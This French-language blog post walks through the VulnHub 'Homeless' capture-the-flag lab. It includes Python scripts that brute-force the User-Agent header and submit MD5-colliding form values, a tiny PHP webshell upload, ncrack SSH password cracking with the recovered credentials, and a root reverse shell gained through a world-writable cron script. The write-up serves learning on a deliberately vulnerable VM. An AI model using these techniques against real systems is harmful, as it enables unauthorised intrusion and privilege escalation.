# Solution du CTF Homeless de VulnHub

[Homeless](https://www.vulnhub.com/entry/homeless-1,215/) est un CTF créé par [Min Ko Ko](http://l33thacker.com/) qui m'a donné du fil à retordre assez vite au point que je me suis demandé s'il n'était pas bogué.  

Montrer patte blanche
---------------------

```plain
Nmap scan report for 192.168.2.3
Host is up (0.00047s latency).
Not shown: 65496 closed ports, 37 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 28:2c:a5:57:c7:eb:82:11:4e:bc:10:45:2f:68:58:f0 (RSA)
|_  256 4d:44:7b:95:ce:9f:86:e2:c8:b4:1c:53:85:0d:90:4a (ECDSA)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry
|_Use Brain with Google
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Transitive by TEMPLATED
MAC Address: 08:00:27:D2:DB:E3 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.0
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On commence très classique avec un Apache et un SSH toujours très utile à avoir.  

Le site web est un peu glauque comme le laisse supposer le nom du challenge mais ce qui saute aux yeux c'est le fait que notre User-Agent est affiché en plein milieu de page...  

J'ai testé quelques attaques comme injection SQL, interprétation PHP, SSI... sans succès.  

J'ai vu que *Nmap* a trouvé un *robots.txt*, c'est peut être le moment de se pencher dessus :  

```plain
User-agent: *
Disallow: Use Brain with Google

Good luck!
Hey Remember rockyou..
```

Ok, on va juste faire un bruteforce sur le User-Agent. La difficulté c'est que l'on ne sait pas quel résultat attendre quand on aura le bon donc sur quel critères discriminer les tests.  

J'ai choisi de regarder à chaque fois le code de statut ainsi que le nombre de caractères dans la page (on décompte préalablement le nombre de caractères que l'on a injecté).  

Voici le code que j'ai écrit :  

```python
import sys
import requests
from requests.exceptions import RequestException

sess = requests.session()
with open(sys.argv[1]) as fd:
    for line in fd:
        word = line.strip()
        if not word:
            continue

        try:
            response = sess.get("http://192.168.2.3/", headers={"user-agent": word})
        except RequestException:
            continue
        except UnicodeEncodeError:
            continue

        if len(response.text) - len(word) != 6301:
            print("Special case with", word)

        if response.status_code != 200:
            print("Special case (status) with", word)
```

On y passe la wordlist RockYou et on finit par avoir un résultat :  

```plain
Special case with cyberdog
```

Un petit coup de *curl -A cyberdog* nous indique de nous rendre sur le dossier *myuploader\_priv/*.  

Casse-tête chinois
------------------

Quand on essaye d'uploader un fichier on se rend vite compte qu'on est face à une restriction très embêtante : *Your file is too large* ah !  

Avec quelques tests on comprend qu'on a une limite de 8 octets pour la taille des fichiers... ce qui ne fait pas beaucoup :D.  

Si on envoie un fichier de 8 octets ou moins on nous dit de trouver le fichier secret mais même en brute-forçant comme un malade on n'arrive à rien.  

Peut être que le test sur la taille du fichier est faite après que le processus d'upload est terminé ? J'ai essayé d'exploiter cette éventuelle situation de race condition mais sans résultats.  

Etant donné que le plus petit code PHP est *<?php ?>* et que les short tags n'ont pas l'air d'être activés j'ai laissé tomber l'idée que l'on puisse mettre du PHP et je me suis tourné vers les fichiers *.htaccess* et *.user.ini*.  

Après avoir parsé les directives existantes pour [Apache](https://httpd.apache.org/docs/2.4/mod/core.html) et PHP j'ai ait trouvé deux qui sont intéressantes :  

* engine : si on désactive cette option alors on coupe l'interprétation du PHP. Peut être que du code PHP contient une information intéressante. *Engine 0* fait pile-poil 8 octets.
* DAV : si on est en mesure d'activer le module WebDAV alors on peut utiliser un outil comme *cadaver* pour uploader nos fichiers. *DAV On* fait 6 octets. Mais les entêtes du serveur ne parlent pas de DAV...

Bien sûr aucune de ces directives n'a fonctionné. Il semble que le *.user.ini* ne soit pas pris en compte et qui plus est, il faudrait être en mesure d'uploader nos fichiers dans le dossier où se trouve le script d'upload et non dans le sous-dossier *files/* où ils sont mis. Et il semble qu'un beau *basename()* soit appliqué or je ne connait aucune technique permettant de bypasser le basename() ni de tricher sur la taille du fichier en PHP (j'ai bien essayé *MAX\_FILE\_SIZE* sans aucune conviction).  

Au passage j'ai trouvé une liste d'astuces liés aux htaccess [ici](https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet), toujours bon à prendre.  

A ce moment là j'ai cherché de l'aide et finalement eu un retour de [@Kartone](https://twitter.com/Kartone) qui m'a rafraîchit la mémoire sur l'existence d'un tag PHP [très peu documenté](https://secure.php.net/manual/en/language.basic-syntax.phptags.php) (une ligne de changelog).  

La doc m'a aussi apprit (où là encore j'avais oublié) qu'il est possible de ne pas fermer la balise PHP. Par conséquent on peut exécuter la commande *ls* avec le code PHP suivant :  

```php
<?=`ls`;
```

F\*CK ! :D  

Ca nous permet de découvrir le fichier *887beed152a3e8f946857bade267bb19d159ef59.txt* dans le dossier *files/* (autant dire que dirb n'allait pas le trouver).  

Ce fichier nous donne l'étape suivante :  

```plain
Well Done! Next step are waiting..

IP/d5fa314e8577e3a7b8534a014b4dcb221de823ad

Regards 
http://www.facebook.com/l33twebhacker
```

Dead and Buried
---------------

Une fois rendu sur l'URL indiquée, on a un formulaire avec trois champs : username, password et code.  

On dispose aussi du code source de la page à notre disposition :  

![Homeless MD5 check source code](https://raw.githubusercontent.com/devl00p/blog/master/images/homeless_ctf_md5.png)

Simple non ? Hmmm... pas vraiment.  

La première chose à laquelle j'ai pensé ce sont les [magic hashes](https://www.whitehatsec.com/blog/magic-hashes/) sauf que le triple === sur les hashs MD5 rend cela impossible.  

L'idée qui m'est venue ensuite ce sont les collisions MD5 puisque l'on sait que cet algo est mort et enterré niveau sécurité... et j'ai eu la bonne idée.  

Trouver des exemples de deux chaînes donnant le même hash est assez simple mais trois ou plus c'est plus compliqué.  

Au boût d'un moment j'ai trouvé [ce github](https://github.com/thereal1024/python-md5-collision) qui utilise un autre logiciel nommé *fastcoll*.  

Comme le téléchargement et la compilation est faite dans la foulée il faut avoir préalablement installé la dépendance *boost-all-dev*.  

On utilise ensuite le script au nom pas vraiment évident :  

```plain
./gen_coll_test.py
Stage 1 of 8
Stage 2 of 8
Stage 3 of 8
Stage 4 of 8
Stage 5 of 8
Stage 6 of 8
Stage 7 of 8
Stage 8 of 8
Done
```

Et on obtient 213 fichiers binaires avec du contenu différents faisant tous 1556 octets et la même somme MD5 (cb94cc8711348558ba49ae9dcf10ecdb). Que demande le peuple ?  

Evidemment il faut pouvoir passer ces données au formulaire, ce qui n'est qu'une formalité pour moi qui écrit du code de ce type tous les jours :  

```python
import requests

sess = requests.session()

data = {
    "username": open("out_test_000.txt", "rb").read(),
    "password": open("out_test_001.txt", "rb").read(),
    "code": open("out_test_002.txt", "rb").read()
}

r = sess.post(
    "http://192.168.2.3/d5fa314e8577e3a7b8534a014b4dcb221de823ad/",
    data=data
)

print(r.url)
print(sess.cookies)
```

Plus qu'à éditer le cookie dans le navigateur avec *Edit This Cookie* qui nous amène alors sur un web shell très basique avec les droits *www-data*.  

Alpinisme Unix
--------------

On a le système suivant :  

```plain
Linux creatigon 4.9.0-4-amd64 #1 SMP Debian 4.9.51-1 (2017-09-28) x86_64 GNU/Linux

Distributor ID:	Debian
Description:	Debian GNU/Linux 9.2 (stretch)
Release:	9.2
Codename:	stretch
```

Et un utilisateur qui est certainement notre prochaine étape :  

```plain
uid=1000(downfall) gid=1000(downfall) groups=1000(downfall),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(bluetooth)
```

Quand on recherche les fichiers de l'utilisateur on se rend compte qu'il reçoit des mails régulièrement (date de sa spool continuellement à jour)... il y a du CRON dans l'air :  

```plain
-rw-rw---- 1 downfall mail 1112412 Feb 18 20:19 /var/mail/downfall
```

Dans le dossier personnel de l'utilisateur il y a aussi un fichier *todo.txt* :  

```plain
hey i am homeless guy. Now i living near python.

Try Harder!

Thanks.
```

Pour ce qui est des fichiers appartenant au groupe de l'utilisateur (*downfall*) on a l'entrée suivante :  

```plain
-rwxrw-r-- 1 root downfall 78 Dec  6 06:14 /lib/logs/homeless.py
```

Dont le contenu est le suivant :  

```python
import os
os.system('date')
print "Hello, Bosss!,\nI am clearning your room"
```

Point important, le dossier */lib/logs* est world-writable :  

```plain
drwxrwxrwx 2 root root 4096 Dec  6 06:14 /lib/logs/
```

On se dit alors qu'il suffira de placer un binaire piégé nommé *date* dans ce dossier et d'attendre qu'un bon gros shell arrive.  

Et... il n'arrive pas. D'ailleurs je ne trouve aucune référence dans les entrées CRON :-/   

Dans */etc/aliases* on trouve les ligne ssuivantes :  

```plain
# /etc/aliases
mailer-daemon: postmaster
postmaster: root
nobody: root
hostmaster: root
usenet: root
news: root
webmaster: root
www: root
ftp: root
abuse: root
noc: root
security: root
root: downfall
```

Qui m'ont fait penser que l'exécution du script était liée au SMTP (Exim4) local mais je n'ai pas eu plus de chance en envoyant un mail à *download@localhost*...  

J'ai écrit un script qui me resservira très probablement qui surveille les process et affiche les nouveaux quand ils arrivent (ce n'est pas assez performant pour des commandes à l'exécution très courte comme *id* mais ça peut servir) :  

```python
from __future__ import print_function
from subprocess import check_output
from time import time

TIME = 60*5

known_pids = {}
start = time()
cmd_index = 48

while True:
    output = check_output(["ps", "-ef", "--sort", "pid"])
    for i, line in enumerate(output.splitlines()):
        line = line.strip()
        if i == 0:
            cmd_index = line.find("CMD")
        else:
            user, pid = line.split()[:2]
            if pid not in known_pids:
                command = line[cmd_index:]
                if command.startswith("ps"):
                    continue

                print(pid, user, command)
                known_pids[pid] = command

    if time() - start > TIME:
        break
```

Une solution plus performante serait de se baser sur *inotify* (exercice laissé au lecteur comme on dit :D )  

En tout cas ça m'a été utile :  

```plain
30747 root /usr/sbin/cron -f
30748 root /bin/sh -c cd /lib/logs/ && ./homeless.py
30750 root /bin/sh -c cd /lib/logs/ && ./homeless.py
30751 Debian-+ /usr/sbin/sendmail -i -FCronDaemon -B8BITMIME -oem root
30755 Debian-+ /usr/sbin/sendmail -i -FCronDaemon -B8BITMIME -oem root
30756 root /usr/sbin/exim4 -Mc 1enu4P-0007zz-GI
```

On voit bien ici que le script Python est appelé tel quel et comme il manque le bon shebang il va tenter d'exécuter *import* qui n'est pas présent sur le système (paquet *ImageMagick* il me semble) mais même en plaçant notre *import* piégé dans */lib/logs* toujours rien...  

En fait tout simplement root n'a pas le dossier courant dans son PATH... Dès lors notre seule option est de devenir *downfall* qui a les droits d'écriture sur le fichier via son GID.  

Ncrack attack
-------------

*Kartone* m'a rappelé la présence d'un indice dans la description du CTF :  

> If you got big stuck, Try with Password start with "sec\*" with nice wordlist.

Dans un premier temps j'ai fait le tri sur *RockYou* :  

```plain
grep -i -e "^sec" /opt/wordlists/rockyou.txt > seclist.txt
```

et Ncrack a fait le reste :  

```plain
$ ncrack -u downfall -P seclist.txt -T4 ssh://192.168.2.3

Starting Ncrack 0.6 ( http://ncrack.org ) at 2018-02-22 21:15 CET

Discovered credentials for ssh on 192.168.2.3 22/tcp:
192.168.2.3 22/tcp ssh: 'downfall' 'secretlyinlove'

Ncrack done: 1 service scanned in 452.97 seconds.

Ncrack finished.
```

En regardant les mails de l'utilisateur on voit que c'était un indice supplémentaire :  

```plain
downfall@creatigon:~$ mail
"/var/mail/downfall": 2202 messages 2202 new
>N   1 Cron Daemon        Tue Dec  5 12:30  21/773   Cron <root@creatigon> root /lib/logs/homeless.py
? 2100
Return-path: <root@creatigon.localhost>
Envelope-to: root@creatigon.localhost
Delivery-date: Mon, 19 Feb 2018 19:02:01 -0500
Received: from root by creatigon.localhost with local (Exim 4.89)
        (envelope-from <root@creatigon.localhost>)
        id 1envNh-0008TY-Rr
        for root@creatigon.localhost; Mon, 19 Feb 2018 19:02:01 -0500
From: root@creatigon.localhost (Cron Daemon)
To: root@creatigon.localhost
Subject: Cron <root@creatigon> cd /lib/logs/ && ./homeless.py
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1envNh-0008TY-Rr@creatigon.localhost>
Date: Mon, 19 Feb 2018 19:02:01 -0500
Status: O
X-UID: 2116

./homeless.py: 1: ./homeless.py: import: not found
./homeless.py: 2: ./homeless.py: Syntax error: word unexpected (expecting ")")
```

Désormais on peut placer les commandes que l'on souhaite dans le script Python et obtenir notre reverse shell root :  

```plain
$ ncat -l -p 9999 -v
Ncat: Version 7.01 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 192.168.2.3.
Ncat: Connection from 192.168.2.3:35872.
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
flag.txt
cat flag.txt
Well done!.

Woo! woo! woo. You Got it!..
Really Appreciate to solve my challenge....

This is my first time challenge..
I hope next time will be more better than this one!...

Thanks
Min Ko Ko
hi@creatigong.com

http://www.creatigon.com
http://www.mmsecurity.net
https://www.facebook.com/l33twebhacker
```

Bilan
-----

Le challenge alternait des étapes simples (brute-force) avec de véritables casses-têtes. Pas forcément très réaliste (peu de chances de tomber sur un formulaire limité aux fichiers de 8 octets et moins) mais ça a permis de redécouvrir des fonctionnalités oubliées de PHP. Enfin c'est toujours un plaisir de partager des idées sur un CTF avec quelqu'un d'autre :)

*Published February 23 2018 at 18:08*